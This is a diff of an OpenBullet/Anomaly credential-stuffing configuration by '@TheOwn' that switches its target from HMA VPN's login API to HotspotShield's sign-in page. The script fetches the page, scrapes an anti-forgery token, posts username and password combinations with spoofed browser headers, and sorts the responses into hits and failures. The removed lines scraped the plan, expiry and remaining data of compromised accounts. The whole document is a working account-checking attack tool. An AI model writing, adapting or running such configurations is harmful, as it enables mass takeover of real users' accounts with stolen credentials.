@@ -1,9 +1,9 @@
 [SETTINGS]
 {
-  "Name": "HMA VPN",
+  "Name": "HotspotShield",
   "SuggestedBots": 100,
   "MaxCPM": 0,
-  "LastModified": "2020-09-04T17:21:15.2990719+04:30",
+  "LastModified": "2020-09-04T16:56:39.4159761+04:30",
   "AdditionalInfo": "",
   "Author": "@TheOwn",
   "Version": "1.4.4 [Anomaly]",
@@ -50,32 +50,31 @@
 }
 
 [SCRIPT]
-#Post REQUEST POST "https://securenetconnection.com/clapi/v1.5/user/login" 
-  CONTENT "username=<USER>&password=<PASS>" 
-  CONTENTTYPE "application/x-www-form-urlencoded" 
+#G REQUEST GET "https://account.hotspotshield.com/sign-in/" 
+  
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
   HEADER "Pragma: no-cache" 
   HEADER "Accept: */*" 
 
+#T PARSE "<SOURCE>" LR "vxsftok: '" "'" -> VAR "TOKEN" 
+
+#P REQUEST POST "https://account.hotspotshield.com/sign-in" 
+  CONTENT "login=<USER>&pwd=<PASS>&remember=0&ajax=true&vxsftok=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "authority: account.hotspotshield.com" 
+  HEADER "method: POST" 
+  HEADER "path: /sign-in" 
+  HEADER "scheme: https" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "origin: https://account.hotspotshield.com" 
+  HEADER "referer: https://account.hotspotshield.com/sign-in/" 
+
 KEYCHECK 
-  KEYCHAIN Failure OR 
-    KEY "Invalid username/password combination" 
   KEYCHAIN Success OR 
-    KEY "\"plan\":" 
-  KEYCHAIN Retry OR 
-    KEY "Error has occurred" 
-
-#UserName PARSE "<SOURCE>" LR "\"user\":\"" "\"," -> CAP "UserName" 
-
-#Plan PARSE "<SOURCE>" LR "\",\"plan\":\"" "\",\"" -> CAP "Plan" 
-
-#Renew PARSE "<SOURCE>" LR "\",\"expires\":\"" "T" -> CAP "Renew" 
-
-#Data_remaining PARSE "<SOURCE>" LR "\",\"remaining\":" "}}" -> CAP "Data remaining" 
-
-KEYCHECK BanOnToCheck=FALSE 
-  KEYCHAIN Custom "FREE" OR 
-    KEY "\"plan\":\"\"" 
-    KEY "\"plan\":\"Free Trial\"" 
-    KEY "\",\"expires\":\"1970-01-01" 
+    KEY "result\":1" 
+  KEYCHAIN Failure OR 
+    KEY "result\":0" 
 
